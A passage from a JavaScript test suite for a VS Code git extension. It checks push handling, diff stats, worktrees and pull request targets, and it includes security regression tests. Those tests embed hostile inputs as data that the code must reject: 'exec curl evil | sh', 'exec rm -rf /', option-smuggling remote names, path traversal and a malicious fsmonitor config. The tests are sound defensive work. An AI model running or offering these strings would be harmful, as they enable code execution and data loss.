  r.commit('topic', { 't.txt': 't\n' });
  r.git('config', 'push.default', 'nothing');
  await assert.rejects(repo.push(), /push\.default is "nothing"/);
  repo.dispose();
});

test('a push refused by a server hook is not reported as "behind"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  const hook = path.join(remoteDir, 'hooks', 'pre-receive');
  fs.writeFileSync(hook, '#!/bin/sh\necho "GH006: Protected branch update failed" >&2\nexit 1\n');
  fs.chmodSync(hook, 0o755);
  r.commit('more', { 'b.txt': 'b\n' });
  await assert.rejects(repo.push(), (e) => e.code === 'RemoteRejected');
  repo.dispose();
});

test('an inherited GIT_EDITOR never reaches git', async (t) => {
  const { repo } = await setup(t);
  const saved = process.env.GIT_EDITOR;
  process.env.GIT_EDITOR = 'vim';
  t.after(() => {
    if (saved === undefined) delete process.env.GIT_EDITOR;
    else process.env.GIT_EDITOR = saved;
  });
  const { stdout } = await repo.exec(['var', 'GIT_EDITOR']);
  assert.equal(stdout.trim(), 'true');
  repo.dispose();
});

test('temporary index files get unique names', async (t) => {
  const { repo } = await setup(t);
  const names = new Set(Array.from({ length: 50 }, () => repo.tempIndexPath('combine')));
  assert.equal(names.size, 50);
  repo.dispose();
});

// ---------------------------------------------------------------------------
// Visual metadata: stats, worktree details

test('shortstat lines are parsed, including singular and missing parts', () => {
  const { parseShortstat } = require('../src/git/parse');
  assert.deepEqual(parseShortstat(' 11 files changed, 470 insertions(+), 39 deletions(-)'), { files: 11, added: 470, deleted: 39 });
  assert.deepEqual(parseShortstat(' 1 file changed, 1 insertion(+)'), { files: 1, added: 1, deleted: 0 });
  assert.deepEqual(parseShortstat(' 2 files changed, 3 deletions(-)'), { files: 2, added: 0, deleted: 3 });
  assert.deepEqual(parseShortstat(''), { files: 0, added: 0, deleted: 0 });
});

test('log and commitStats report lines added/deleted per commit (merges against the first parent)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n2\n' });
  r.git('checkout', '-q', '-b', 'side');
  r.commit('side', { 's.txt': 's\ns\ns\n' });
  r.git('checkout', '-q', 'main');
  const two = r.commit('two', { 'a.txt': '1\nTWO\n', 'b.txt': 'b\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'merge side', 'side');
  const merge = r.git('rev-parse', 'HEAD');
  r.commit('empty');
  const log = await repo.log({ revs: ['HEAD'], stats: true, topo: true });
  const by = new Map(log.map((c) => [c.subject, c.stats]));
  assert.deepEqual(by.get('two'), { files: 2, added: 2, deleted: 1 });
  assert.deepEqual(by.get('merge side'), { files: 1, added: 3, deleted: 0 }, 'merge: first-parent diff');
  assert.deepEqual(by.get('empty'), { files: 0, added: 0, deleted: 0 });
  assert.equal(log.length, 5, 'stats do not change which commits are listed');
  const stats = await repo.commitStats([two, merge, 'not-a-sha']);
  assert.deepEqual(stats.get(two), { files: 2, added: 2, deleted: 1 });
  assert.deepEqual(stats.get(merge), { files: 1, added: 3, deleted: 0 });
  assert.equal(stats.size, 2);
  repo.dispose();
});

test('file history carries the lines changed in that file', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('one', { 'f.txt': '1\n', 'other.txt': 'x\ny\n' });
  r.commit('two', { 'f.txt': '1\n2\n3\n', 'other.txt': 'z\n' });
  const h = await repo.fileHistory('f.txt', { stats: true });
  assert.deepEqual(h.map((c) => c.stats), [{ files: 1, added: 2, deleted: 0 }, { files: 1, added: 1, deleted: 0 }]);
  repo.dispose();
});

test('worktree details: changes, upstream and the checked-out commit of every worktree', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = `${r.dir}-wt`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'topic', other);
  fs.writeFileSync(path.join(other, 'a.txt'), '2\n');
  fs.writeFileSync(path.join(other, 'new.txt'), 'n\n');
  execFileSync('git', ['add', 'new.txt'], { cwd: other });
  r.write('u.txt', 'u\n');
  const list = await repo.getWorktreeDetails();
  const main = list.find((w) => w.isMain);
  const topic = list.find((w) => w.branch === 'topic');
  assert.equal(main.isCurrent, true);
  assert.deepEqual(main.changes, { staged: 0, unstaged: 0, untracked: 1, conflicts: 0 });
  assert.deepEqual(topic.changes, { staged: 1, unstaged: 1, untracked: 0, conflicts: 0 });
  assert.equal(topic.isCurrent, false);
  assert.equal(topic.commit.subject, 'base');
  fs.rmSync(other, { recursive: true, force: true });
  const after = await repo.getWorktreeDetails();
  assert.equal(after.find((w) => w.branch === 'topic').changes, undefined, 'a missing folder has no details, and no error');
  repo.dispose();
});

// ---------------------------------------------------------------------------
test('color.diff=always in the user config does not leak into patches or line history', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('add', { 'a.txt': '1\n2\n' });
  r.commit('edit', { 'a.txt': '1\nTWO\n' });
  for (const k of ['color.diff', 'color.ui', 'color.status', 'color.branch']) r.git('config', k, 'always');
  r.write('a.txt', 'changed\n');
  assert.doesNotMatch(await repo.diffPatch('all'), /\x1b\[/);
  const h = await repo.lineHistory('a.txt', 1, 2);
  assert.deepEqual(h.map((c) => c.change.status), ['M', 'A'], 'the adding commit is recognised');
  repo.dispose();
});

test('combined diff stays exact across a selected rename commit', async (t) => {
  const { r, repo } = await setup(t);
  const pad = (lines) => lines.join('\n1\n2\n3\n4\n') + '\n';
  r.commit('base', { 'a.txt': pad(['top', 'middle', 'bottom']) });
  const c1 = r.commit('c1', { 'a.txt': pad(['TOP', 'middle', 'bottom']) });
  r.commit('c2 (not selected)', { 'a.txt': pad(['TOP', 'MIDDLE', 'bottom']) });
  r.git('mv', 'a.txt', 'b.txt');
  const c3 = r.commit('c3 rename');
  const c4 = r.commit('c4', { 'b.txt': pad(['TOP', 'MIDDLE', 'BOTTOM']) });
  const res = await repo.getMultiCommitChanges([c1, c3, c4]);
  assert.equal(res.exact, true, `failed: ${res.failed}`);
  assert.deepEqual(res.files.map((f) => [f.status[0], f.path]), [['R', 'b.txt']]);
  assert.equal(await repo.showText(res.files[0].afterRef, 'b.txt'), pad(['TOP', 'middle', 'BOTTOM']), "c2's edit is left out");
  repo.dispose();
});

test('commit message and author search take the text literally', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('fix [ui] crash', { 'a.txt': '1\n' });
  r.commit('other', { 'a.txt': '2\n' });
  const hits = await repo.log({ revs: ['HEAD'], grep: '[ui]' });
  assert.deepEqual(hits.map((c) => c.subject), ['fix [ui] crash']);
  repo.dispose();
});

test('Commit Selected runs as one queue entry: a stage queued meanwhile survives', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n', 'b.txt': '1\n' });
  r.write('a.txt', '2\n');
  r.git('add', 'a.txt');
  r.write('b.txt', '2\n');
  const commit = repo.commitStagedPaths('only a', ['a.txt']);
  const stage = repo.stage(['b.txt']); // queued behind the whole commit, not between its steps
  await Promise.all([commit, stage]);
  assert.equal(r.git('log', '-1', '--format=%s'), 'only a');
  assert.equal(r.git('diff', '--cached', '--name-only'), 'b.txt');
  repo.dispose();
});

// ---------------------------------------------------------------------------
// Create pull request target

test('pull request target: published branch, default branch, forks via "upstream"', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  // Fetch from the local bare repository, but let the remote look like github.com.
  r.git('remote', 'set-url', '--push', 'origin', 'https://github.com/me/repo.git');
  r.git('remote', 'set-head', 'origin', 'main');
  r.git('checkout', '-q', '-b', 'topic');
  r.commit('topic', { 't.txt': 't\n' });
  const { pullRequestTarget } = requireWithVscode('../src/vscode/commands/createPullRequest');
  assert.equal((await pullRequestTarget(repo, 'topic')).needsPublish, true);
  r.git('push', '-q', remoteDir, 'topic');
  r.git('fetch', '-q', 'origin');
  r.git('branch', '-q', '-u', 'origin/topic');
  r.commit('unpushed', { 'u.txt': 'u\n' });
  let tg = await pullRequestTarget(repo, 'topic');
  assert.deepEqual([tg.headWeb, tg.headBranch, tg.baseRemote, tg.baseWeb, tg.ahead], ['https://github.com/me/repo', 'topic', 'origin', 'https://github.com/me/repo', 1]);
  assert.equal(await repo.remoteDefaultBranch('origin'), 'main');
  r.git('remote', 'add', 'upstream', 'https://github.com/org/repo.git');
  tg = await pullRequestTarget(repo, 'topic');
  assert.deepEqual([tg.baseRemote, tg.baseWeb], ['upstream', 'https://github.com/org/repo']);
  repo.dispose();
});

// ---------------------------------------------------------------------------
test('a crafted commit cannot forge log records or todo lines (control bytes in messages)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const sha = r.git('rev-parse', 'HEAD');
  // Body bytes that used to split our records: RS, then a fake record whose subject holds a newline.
  const forged = `subject\n\nbody\x1e${sha}\x1f\x1fEvil\x1fe@x\x1f1\x1fEvil\x1fe@x\x1f1\x1f\x1fsubj\nexec touch PWNED\x1f\x1e`;
  r.write('b.txt', 'b\n');
  r.git('add', 'b.txt');
  execFileSync('git', ['commit', '-q', '-F', '-'], { cwd: r.dir, input: forged });
  const commits = await repo.log({ revs: ['HEAD'], body: true });
  assert.equal(commits.length, 2, 'no extra (forged) commits');
  for (const c of commits) assert.doesNotMatch(c.subject, /[\n\r\x1e\x1f]/);
  const { serializeTodo } = require('../src/git/rebaseTodo');
  const todo = serializeTodo([{ type: 'commit', action: 'pick', sha, subject: 'x\nexec touch PWNED' }, { type: 'other', text: 'break\nexec rm -rf /' }]);
  assert.equal(todo.split('\n').filter(Boolean).length, 2, 'every entry stays on one line');
  assert.doesNotMatch(todo, /^exec/m);
  assert.throws(() => serializeTodo([{ type: 'commit', action: 'exec', sha, subject: '' }]), /Invalid/);
  assert.throws(() => serializeTodo([{ type: 'commit', action: 'pick', sha: '--root', subject: '' }]), /Invalid/);
  repo.dispose();
});

test('a rebase plan may only reorder what was offered', () => {
  const { checkPlan } = requireWithVscode('../src/vscode/webviews/rebaseEditor');
  const a = 'a'.repeat(40);
  const b = 'b'.repeat(40);
  const offered = [{ type: 'commit', sha: a }, { type: 'other', text: 'break' }, { type: 'commit', sha: b }];
  checkPlan([{ type: 'commit', sha: b }, { type: 'commit', sha: a }, { type: 'other', text: 'break' }], offered);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'commit', sha: b }, { type: 'other', text: 'exec curl evil | sh' }], offered), /not offered/);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'commit', sha: 'c'.repeat(40) }, { type: 'other', text: 'break' }], offered), /not offered/);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'other', text: 'break' }], offered), /missing/);
  assert.throws(() => checkPlan([{ type: 'commit', sha: a }, { type: 'commit', sha: a }, { type: 'other', text: 'break' }], offered), /not offered/);
});

test('activity: commits, people, files, merged pull requests, branches and tags in the period', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('old', { 'a.txt': '1\n' });
  r.git('checkout', '-q', '-b', 'feature');
  r.commit('feature work', { 'f.txt': 'f\nf\n' });
  r.git('checkout', '-q', 'main');
  r.commit('main work (#12)', { 'a.txt': '1\n2\n' });
  r.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #7 from octo/feature', 'feature');
  r.git('tag', 'v1');
  const a = await repo.activity({ days: 3650 });
  assert.deepEqual(a.commits.map((c) => c.subject).sort(), ['feature work', 'main work (#12)', 'old'], 'merges are left out');
  assert.equal(a.people.length, 1);
  assert.equal(a.people[0].commits, 3);
  assert.deepEqual(a.pulls.map((p) => p.number).sort(), [12, 7]);
  assert.ok(a.files.some((f) => f.path === 'a.txt' && f.commits === 2));
  assert.ok(a.branches.some((b) => b.name === 'feature'));
  assert.ok(a.tags.some((x) => x.name === 'v1'));
  const current = await repo.activity({ days: 3650, revs: ['HEAD~1'] });
  assert.ok(!current.commits.some((c) => c.subject === 'feature work'), 'scope: the current branch only');
  const s = await repo.activitySummary(3650);
  assert.deepEqual([s.commits, s.authors, s.added], [3, 1, 4]);
  assert.strictEqual(await repo.activitySummary(3650), s, 'cached until a ref moves');
  repo.dispose();
});

// ---------------------------------------------------------------------------
test('a pull request is diffed against its fresh base, not a stale local copy (no test merge)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { other } = withRemote(t, r);
  // Upstream main moves on; our origin/main does not know.
  const otherDir = other('rev-parse', '--show-toplevel');
  fs.writeFileSync(path.join(otherDir, 'other.txt'), 'o\n');
  other('add', 'other.txt');
  other('commit', '-q', '-m', 'other.txt on main');
  other('push', '-q', 'origin', 'main');
  // A pull request branching from the new main.
  other('checkout', '-q', '-b', 'feature');
  fs.writeFileSync(path.join(otherDir, 'feat.txt'), 'f\n');
  other('add', 'feat.txt');
  other('commit', '-q', '-m', 'feature');
  const headSha = other('rev-parse', 'HEAD');
  other('push', '-q', 'origin', `HEAD:refs/pull/9/head`);
  const sha = await repo.fetchPullRequest('origin', 9, { withMerge: false });
  assert.equal(sha, headSha);
  const res = await repo.resolvePullRequestBase('origin', 9, sha, undefined, { baseBranch: 'main' });
  assert.deepEqual((await repo.diffFiles(res.mergeBase, sha)).map((f) => f.path), ['feat.txt'], 'only the pull request\'s own change');
  repo.dispose();
});

test('"Add to .gitignore" never writes through a symlinked .gitignore, nor multi-line patterns', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const outside = path.join(path.dirname(r.dir), `outside-${path.basename(r.dir)}`);
  fs.writeFileSync(outside, 'echo original\n');
  t.after(() => fs.rmSync(outside, { force: true }));
  fs.symlinkSync(outside, path.join(r.dir, '.gitignore'));
  await assert.rejects(repo.ignore('/build.log'), /symbolic link/);
  assert.equal(fs.readFileSync(outside, 'utf8'), 'echo original\n');
  fs.unlinkSync(path.join(r.dir, '.gitignore'));
  await assert.rejects(repo.ignore('/a\necho PWNED'), /single line/);
  await repo.ignore('/build.log');
  assert.equal(r.read('.gitignore'), '/build.log\n');
  repo.dispose();
});

test('hooks of local commands do not get the credential helper', { skip: process.platform === 'win32' }, async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const exec = require('../src/git/exec');
  exec.configure({ env: { GIT_ASKPASS: '/fake/askpass', COMMIT_CORNER_ASKPASS_TOKEN: 'secret' } });
  t.after(() => exec.configure({ env: {} }));
  const seen = path.join(r.dir, '.git', 'seen-env');
  const hook = path.join(r.dir, '.git', 'hooks', 'pre-commit');
  fs.writeFileSync(hook, `#!/bin/sh\necho "[$GIT_ASKPASS][$COMMIT_CORNER_ASKPASS_TOKEN]" > "${seen}"\n`);
  fs.chmodSync(hook, 0o755);
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('change');
  assert.equal(fs.readFileSync(seen, 'utf8').trim(), '[][]');
  repo.dispose();
});

test('a worktree branch without upstream is measured against the default branch', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = `${r.dir}-agent`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'agent', other);
  for (const n of [1, 2]) {
    fs.writeFileSync(path.join(other, `f${n}.txt`), `${n}\n`);
    execFileSync('git', ['add', '-A'], { cwd: other });
    execFileSync('git', ['-c', 'user.name=A', '-c', 'user.email=a@x', 'commit', '-q', '-m', `agent ${n}`], { cwd: other });
  }
  const agent = (await repo.getWorktreeDetails()).find((w) => w.branch === 'agent');
  assert.deepEqual([agent.base, agent.baseAhead, agent.baseBehind], ['main', 2, 0]);
  repo.dispose();
});

test('a repository committed inside a clone is not opened (its config could run programs)', { skip: process.platform === 'win32' }, async (t) => {
  const { r } = await setup(t);
  // A bare repository as ordinary files, whose config makes the folder its own working tree.
  const evil = path.join(r.dir, 'evil');
  fs.mkdirSync(path.join(evil, 'objects'), { recursive: true });
  fs.mkdirSync(path.join(evil, 'refs'), { recursive: true });
  fs.writeFileSync(path.join(evil, 'HEAD'), 'ref: refs/heads/main\n');
  const marker = path.join(r.dir, 'ran');
  fs.writeFileSync(path.join(evil, 'config'), `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = .\n\tfsmonitor = "touch '${marker}'; false"\n`);
  fs.writeFileSync(path.join(evil, 'readme.txt'), 'hi\n');
  await assert.rejects(Repository.open(evil), (e) => e.code === 'ForeignGitDir');
  assert.equal(fs.existsSync(marker), false);
  // The enclosing repository itself (and its subfolders) still opens.
  assert.equal((await Repository.open(path.join(r.dir))).root, fs.realpathSync(r.dir));
});

test('revisions that are not strings never reach git (an array would be stringified)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const out = path.join(r.dir, 'written');
  await assert.rejects(repo.getCommit([`--output=${out}`]), /Refusing/);
  assert.equal(fs.existsSync(out), false);
  repo.dispose();
});

test('working-tree reads stay inside the repository', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { WORKTREE } = require('../src/git/repository');
  fs.writeFileSync(`${r.dir}-secret`, 'secret\n');
  t.after(() => fs.rmSync(`${r.dir}-secret`, { force: true }));
  assert.equal(await repo.show(WORKTREE, `../${path.basename(r.dir)}-secret`), null);
  assert.equal(await repo.show(WORKTREE, '/etc/hostname'.replace(/^\//, '../../../../../../../../etc/')), null);
  assert.equal(String(await repo.show(WORKTREE, 'a.txt')), '1\n');
  repo.dispose();
});

test('a network command gets its own credential-helper lease, revoked when it exits', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const { remoteDir } = withRemote(t, r);
  const exec = require('../src/git/exec');
  const leases = [];
  exec.configure({
    env: () => {
      const l = { env: { COMMIT_CORNER_ASKPASS_TOKEN: `t${leases.length}` }, released: false };
      l.release = () => (l.released = true);
      leases.push(l);
      return l;
    },
  });
  t.after(() => exec.configure({ env: {} }));
  assert.ok(remoteDir);
  await repo.fetch();
  assert.ok(leases.length >= 1, 'fetch asked for a lease');
  assert.ok(leases.every((l) => l.released), 'every lease is released once git exits');
  const before = leases.length;
  r.write('a.txt', '2\n');
  await repo.stage(['a.txt']);
  await repo.commit('local');
  assert.equal(leases.length, before, 'local commands get no lease');
  repo.dispose();
});

test('notification text cannot carry command links', () => {
  const { noLinks } = requireWithVscode('../src/vscode/notify');
  const name = '[Fix line endings](command:workbench.action.terminal.sendSequence?%7B%22text%22%3A%22echo%20pwned%5Cn%22%7D)';
  const shown = noLinks(`Discard changes in "${name}"?`);
  assert.doesNotMatch(shown, /\]\(/);
  assert.equal(shown.replace(/​/g, ''), `Discard changes in "${name}"?`);
  // "[a] (url)" is not a link either way; it stays readable.
  assert.equal(noLinks('[a] (https://x)').replace(/\u200b/g, ''), '[a] (https://x)');
});

test('webview messages with anything but SHAs in sha/shas are dropped', () => {
  const { validMessageShas, selectedShas } = requireWithVscode('../src/vscode/util');
  const sha = 'a'.repeat(40);
  assert.equal(validMessageShas({ type: 'openCommit', sha }), true);
  assert.equal(validMessageShas({ type: 'ready' }), true);
  assert.equal(validMessageShas({ type: 'openCommit', sha: ['--output=/tmp/x'] }), false);
  assert.equal(validMessageShas({ type: 'openCommit', sha: '--output=/tmp/x' }), false);
  assert.equal(validMessageShas({ type: 'openCommits', shas: [sha, { toString: () => '-x' }] }), false);
  assert.equal(validMessageShas({ type: 'actions', sha: '*', shas: ['*'] }, ['*']), true);
  assert.equal(validMessageShas(null), false);
  assert.deepEqual(selectedShas({ shas: [sha, '--all'] }), [sha]);
});

test('the rebase-todo editor never opens a repository by itself', async () => {
  const vscode = requireWithVscode('vscode');
  const { RebaseTodoEditorProvider } = requireWithVscode('../src/vscode/webviews/rebaseEditor');
  let opened = 0;
  const ctx = {
    extensionUri: vscode.Uri.file(path.join(__dirname, '..')),
    manager: { getRepositoryForGitPath: () => undefined, openRepository: async () => { opened++; } },
  };
  const posted = [];
  const disposable = { dispose() {} };
  const webview = {
    cspSource: 'vscode-resource:', asWebviewUri: (u) => u, postMessage: (m) => posted.push(m), options: {}, html: '',
    onDidReceiveMessage: (fn) => ((webview.handler = fn), disposable),
  };
  const panel = { webview, onDidDispose: () => disposable, dispose() {} };
  const document = { uri: vscode.Uri.file('/tmp/outside/.git/rebase-merge/git-rebase-todo'), getText: () => `pick ${'a'.repeat(40)} x\n` };
  await new RebaseTodoEditorProvider(ctx).resolveCustomTextEditor(document, panel);
  await webview.handler({ type: 'ready' });
  assert.equal(opened, 0);
  assert.equal(posted[0].type, 'init');
});

test("a worktree's changes since it left the base: commits, uncommitted and untracked work", async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n', 'gone.txt': 'x\n' });
  const other = `${r.dir}-agent`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'agent', other);
  fs.writeFileSync(path.join(other, 'a.txt'), '2\n');
  execFileSync('git', ['-c', 'user.name=A', '-c', 'user.email=a@x', 'commit', '-qam', 'agent work'], { cwd: other });
  r.commit('main moves on', { 'main.txt': 'm\n' });
  fs.rmSync(path.join(other, 'gone.txt'));
  fs.writeFileSync(path.join(other, 'new.txt'), 'n\n');
  assert.equal(await repo.defaultBaseRef(), 'main');
  const { mergeBase, changes } = await repo.worktreeChangesSince(other, 'main');
  assert.equal(mergeBase, r.git('rev-parse', 'main~1'));
  assert.deepEqual(changes.map((c) => `${c.status} ${c.path}`).sort(), ['A new.txt', 'D gone.txt', 'M a.txt']);
  await assert.rejects(repo.worktreeChangesSince(other, '--output=x'), /Refusing/);
  repo.dispose();
});

test('linked worktrees and submodules still open (their .git is a file pointing to the git directory)', async (t) => {
  const { r } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const other = `${r.dir}-wt`;
  t.after(() => fs.rmSync(other, { recursive: true, force: true }));
  r.git('worktree', 'add', '-q', '-b', 'wt', other);
  const linked = await Repository.open(other);
  assert.equal(linked.root, fs.realpathSync(other));
  // A submodule: its .git file points into the superproject's .git/modules.
  const lib = createRepo();
  t.after(() => lib.cleanup());
  lib.commit('lib', { 'lib.txt': 'l\n' });
  r.git('-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', lib.dir, 'lib');
  const sub = await Repository.open(path.join(r.dir, 'lib'));
  assert.equal(sub.root, fs.realpathSync(path.join(r.dir, 'lib')));
});

test('tab labels of revisions: short SHAs and names, never a "/" that would cut the label', () => {
  const { revLabel } = requireWithVscode('../src/vscode/uri');
  assert.equal(revLabel('a'.repeat(40)), 'aaaaaaa');
  assert.equal(revLabel(`${'b'.repeat(40)}^`), 'bbbbbbb^');
  assert.equal(revLabel(':'), 'index');
  assert.equal(revLabel(':3'), 'theirs');
  assert.equal(revLabel('~worktree~'), 'working tree');
  assert.equal(revLabel(null), 'none');
  assert.equal(revLabel('origin/main'), 'origin∕main');
});

test('right after a history rewrite, "undo" means the rewrite while HEAD is still where it left it', () => {
  const { lastRewrite, pendingRewrite } = requireWithVscode('../src/vscode/rewrites');
  const repo = { root: '/r', state: { head: { sha: 'b'.repeat(40), branch: 'main' } } };
  assert.equal(pendingRewrite(repo), undefined);
  lastRewrite.set('/r', { branch: 'main', before: 'a'.repeat(40), after: 'b'.repeat(40), label: 'Interactive rebase', at: Date.now() });
  assert.equal(pendingRewrite(repo).label, 'Interactive rebase');
  repo.state.head.sha = 'c'.repeat(40); // a commit on top
  assert.equal(pendingRewrite(repo), undefined);
  lastRewrite.delete('/r');
});

test('icon syntax in repository text is shown literally where VS Code renders $(icons)', () => {
  const { escapeIcons } = requireWithVscode('../src/vscode/util');
  assert.equal(escapeIcons('Alice $(check) Admin'), 'Alice \\$(check) Admin');
  assert.equal(escapeIcons('plain'), 'plain');
});

test('a crafted subject cannot forge or hide commits in file history, line history or stats', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n2\n3\n' });
  // Every separator byte we ever used, a fake record with another SHA, and our own field order.
  const fake = 'd'.repeat(40);
  const subject = `evil\x1e${fake}\x1f\x1f1\x1f1\x1f\x1fMallory\x1fm@x\x1fMallory\x1fm@x\x1fForged commit\x1d`;
  r.write('a.txt', '1\n2\nthree\n');
  r.git('add', 'a.txt');
  execFileSync('git', ['commit', '-q', '-F', '-'], { cwd: r.dir, input: subject });
  const real = r.git('rev-parse', 'HEAD');
  const check = (commits, what) => {
    assert.ok(commits.some((c) => c.sha === real), `${what}: the real commit is listed`);
    assert.ok(!commits.some((c) => c.sha === fake || /Mallory|Forged/.test(c.authorName)), `${what}: no forged commit`);
  };
  check(await repo.fileHistory('a.txt', { stats: true }), 'fileHistory');
  check(await repo.lineHistory('a.txt', 3, 3), 'lineHistory');
  check(await repo.log({ revs: ['HEAD'], stats: true }), 'log({stats})');
  const stats = await repo.commitStats([real]);
  assert.deepEqual([...stats.keys()], [real]);
  assert.deepEqual(stats.get(real), { files: 1, added: 1, deleted: 1 });
  const combined = await repo.getMultiCommitChanges([real]);
  assert.deepEqual(combined.commits.map((c) => c.sha), [real]);
  repo.dispose();
});

test('remote names that look like options never reach git (fetch, ls-remote, push, PR refs)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const marker = path.join(r.dir, 'PWNED');
  const evil = `--upload-pack=touch ${marker}; git-upload-pack`;
  await assert.rejects(repo.fetch({ remote: evil }), /remote name/);
  await assert.rejects(repo.listPullRequests(evil), /remote name/);
  await assert.rejects(repo.push({ remote: evil }), /remote name/);
  assert.throws(() => repo.prRef(evil, 1), /remote name/);
  assert.throws(() => repo.pushTag(['--x'], 'v1'), /remote name/);
  assert.throws(() => repo.addRemote('-x', 'u'), /remote name/);
  assert.equal(fs.existsSync(marker), false);
  // The graph page may name a commit or a PR number, never a remote or a repository.
  const { pageArgs } = requireWithVscode('../src/vscode/webviews/graphPanel');
  assert.deepEqual(pageArgs({ remote: evil, repoRoot: '/etc', sha: 'a'.repeat(40), number: 3, x: 1 }, '/repo'), { repoRoot: '/repo', sha: 'a'.repeat(40), number: 3 });
  assert.deepEqual(pageArgs({ sha: '--all', number: '3' }, '/repo'), { repoRoot: '/repo' });
  repo.dispose();
});

test('remotes whose URL has a space are listed; quoted paths are unquoted', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.git('remote', 'add', 'sp', '/tmp/some dir/repo.git');
  assert.deepEqual((await repo.getRemotes()).map((x) => [x.name, x.fetchUrl]), [['sp', '/tmp/some dir/repo.git']]);
  const P = require('../src/git/parse');
  assert.equal(P.unquoteC('"tab\\there.txt"'), 'tab\there.txt');
  assert.equal(P.unquoteC('"\\303\\244.txt"'), 'ä.txt');
  assert.equal(P.unquoteC('plain "name".txt'), 'plain "name".txt');
  repo.dispose();
});

test('stash pop with an untracked file in the way explains instead of retrying', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.write('a.txt', '2\n');
  r.write('new.txt', 'stashed\n');
  r.git('stash', 'push', '-u', '-q');
  r.write('new.txt', 'in the way\n');
  await assert.rejects(repo.stashApply('stash@{0}', true), /untracked file "new.txt" could not be restored/);
  assert.equal(r.git('stash', 'list').split('\n').filter(Boolean).length, 1, 'the stash is kept');
  repo.dispose();
});

test('git runs only in submodule folders that belong to this repository', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const fake = path.join(r.dir, 'vendor');
  const elsewhere = makeTempDir('cc-embedded-');
  t.after(() => fs.rmSync(elsewhere, { recursive: true, force: true }));
  fs.mkdirSync(fake);
  fs.writeFileSync(path.join(fake, '.git'), `gitdir: ${elsewhere}\n`);
  assert.equal(await repo.isOwnSubmodule(fake), false);
  assert.equal(await repo.isOwnSubmodule(path.join(r.dir, 'missing')), false);
  repo.dispose();
});

test('discarding an intent-to-add file never empties it (git add -N)', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  r.write('new.txt', 'precious work\n');
  r.git('add', '-N', 'new.txt');
  r.write('a.txt', '2\n');
  await repo.refreshState();
  const skipped = await repo.discard(['new.txt', 'a.txt']);
  assert.deepEqual(skipped, ['new.txt']);
  assert.equal(r.read('new.txt'), 'precious work\n', 'left alone for the caller to trash');
  assert.equal(r.read('a.txt'), '1\n');
  await repo.forgetIntentToAdd(skipped);
  assert.match(r.git('status', '--porcelain'), /^\?\? new\.txt$/m, 'now an untracked file');
  repo.dispose();
});

test('a folder that no longer exists is not "git not found"', async () => {
  const { git: run } = require('../src/git/exec');
  await assert.rejects(run(['status'], { cwd: path.join(makeTempDir('cc-gone-'), 'removed') }), (e) => e.code === 'NoSuchFolder');
});

test('a remote name with "/" still gets its tracking branch', async (t) => {
  const { r, repo } = await setup(t);
  r.commit('base', { 'a.txt': '1\n' });
  const remoteDir = makeTempDir('cc-up-');
  t.after(() => fs.rmSync(remoteDir, { recursive: true, force: true }));
  execFileSync('git', ['init', '-q', '--bare', remoteDir]);
  r.git('remote', 'add', 'up/stream', remoteDir);
  r.git('push', '-q', 'up/stream', 'HEAD:refs/heads/dev');
  r.git('fetch', '-q', 'up/stream');
  assert.deepEqual(await repo.trackFlag('dev', 'up/stream/dev'), ['--track']);
  repo.dispose();
});

test('worktree paths with newlines survive NUL-separated parsing', () => {
  const P = require('../src/git/parse');
  const text = ['worktree /tmp/main', 'HEAD ' + 'a'.repeat(40), 'branch refs/heads/main', '', 'worktree /tmp/wt\nnl', 'HEAD ' + 'b'.repeat(40), 'detached', '', ''].join('\0');
  assert.deepEqual(P.parseWorktrees(text, true).map((w) => w.path), ['/tmp/main', '/tmp/wt\nnl']);
});

test('a superseded refresh still hands its caller what it just read', async (t) => {
